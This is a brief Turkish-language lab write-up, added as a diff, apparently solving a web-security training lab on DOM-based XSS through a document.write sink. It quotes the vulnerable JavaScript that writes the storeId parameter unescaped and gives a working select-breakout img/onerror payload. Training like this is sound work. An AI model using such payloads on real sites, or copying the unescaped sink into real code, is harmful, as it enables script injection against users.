@@ -1,0 +1,20 @@
+LAB: DOM XSS in document.write sink using source location.search inside a select element
+
+1 - Herhangi bir ürüne girerek stok sorgusu yapın, isteği Burp Suiteden yakalayın.
+
+var stores = ["London","Paris","Milan"];
+                                var store = (new URLSearchParams(window.location.search)).get('storeId');
+                                document.write('<select name="storeId">');
+                                if(store) {
+                                    document.write('<option selected>'+store+'</option>');
+                                }
+                                for(var i=0;i<stores.length;i++) {
+                                    if(stores[i] === store) {
+                                        continue;
+                                    }
+                                    document.write('<option>'+stores[i]+'</option>');
+                                }
+                                document.write('</select>');
+
+2 - 
+productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
